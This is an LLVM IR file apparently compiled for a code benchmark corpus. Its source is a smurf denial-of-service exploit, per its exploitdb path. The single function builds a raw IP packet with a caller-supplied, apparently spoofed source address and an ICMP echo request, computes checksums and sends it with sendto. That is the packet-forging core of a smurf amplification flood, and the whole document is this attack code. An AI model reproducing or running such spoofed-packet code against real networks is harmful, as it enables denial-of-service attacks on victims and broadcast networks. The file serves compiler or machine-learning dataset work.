; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_19117.c_smurf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_19117.c_smurf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.iphdr = type { i32, i32, i32, i8*, i32, i32, i32, i64, i64, i32 }
%struct.icmphdr = type { i32, i8*, i64 }
%struct.sockaddr = type { i32 }

@IPPROTO_ICMP = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @smurf(i32 %0, i32 %1, i32 %2, i32 %3) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.iphdr*, align 8
  %10 = alloca %struct.icmphdr*, align 8
  %11 = alloca i8*, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 0
  %13 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %12, i32 0, i32 0
  store i32 %1, i32* %13, align 4
  store i32 %0, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %14 = load i32, i32* %8, align 4
  %15 = sext i32 %14 to i64
  %16 = add i64 88, %15
  %17 = trunc i64 %16 to i32
  %18 = call i8* @malloc(i32 %17)
  store i8* %18, i8** %11, align 8
  %19 = load i8*, i8** %11, align 8
  %20 = bitcast i8* %19 to %struct.iphdr*
  store %struct.iphdr* %20, %struct.iphdr** %9, align 8
  %21 = load i8*, i8** %11, align 8
  %22 = getelementptr inbounds i8, i8* %21, i64 64
  %23 = bitcast i8* %22 to %struct.icmphdr*
  store %struct.icmphdr* %23, %struct.icmphdr** %10, align 8
  %24 = load i8*, i8** %11, align 8
  %25 = load i32, i32* %8, align 4
  %26 = sext i32 %25 to i64
  %27 = add i64 88, %26
  %28 = trunc i64 %27 to i32
  %29 = call i32 @memset(i8* %24, i32 0, i32 %28)
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = add i64 88, %31
  %33 = trunc i64 %32 to i32
  %34 = call i32 @htons(i32 %33)
  %35 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 9
  store i32 %34, i32* %36, align 8
  %37 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %38 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %37, i32 0, i32 0
  store i32 5, i32* %38, align 8
  %39 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 1
  store i32 4, i32* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 2
  store i32 255, i32* %42, align 8
  %43 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i64 0, i64* %44, align 8
  %45 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 7
  store i64 0, i64* %46, align 8
  %47 = load i32, i32* @IPPROTO_ICMP, align 4
  %48 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 6
  store i32 %47, i32* %49, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 0
  %51 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 4
  %53 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 5
  store i32 %52, i32* %54, align 4
  %55 = load i32, i32* %7, align 4
  %56 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %56, i32 0, i32 4
  store i32 %55, i32* %57, align 8
  %58 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %59 = bitcast %struct.iphdr* %58 to i32*
  %60 = call i8* @in_chksum(i32* %59, i32 64)
  %61 = load %struct.iphdr*, %struct.iphdr** %9, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 3
  store i8* %60, i8** %62, align 8
  %63 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %64 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %63, i32 0, i32 0
  store i32 8, i32* %64, align 8
  %65 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %66 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %65, i32 0, i32 2
  store i64 0, i64* %66, align 8
  %67 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %68 = bitcast %struct.icmphdr* %67 to i32*
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = add i64 24, %70
  %72 = trunc i64 %71 to i32
  %73 = call i8* @in_chksum(i32* %68, i32 %72)
  %74 = load %struct.icmphdr*, %struct.icmphdr** %10, align 8
  %75 = getelementptr inbounds %struct.icmphdr, %struct.icmphdr* %74, i32 0, i32 1
  store i8* %73, i8** %75, align 8
  %76 = load i32, i32* %6, align 4
  %77 = load i8*, i8** %11, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 88, %79
  %81 = trunc i64 %80 to i32
  %82 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %83 = call i32 @sendto(i32 %76, i8* %77, i32 %81, i32 0, %struct.sockaddr* %82, i32 4)
  %84 = load i8*, i8** %11, align 8
  %85 = call i32 @free(i8* %84)
  ret void
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i8* @in_chksum(i32*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
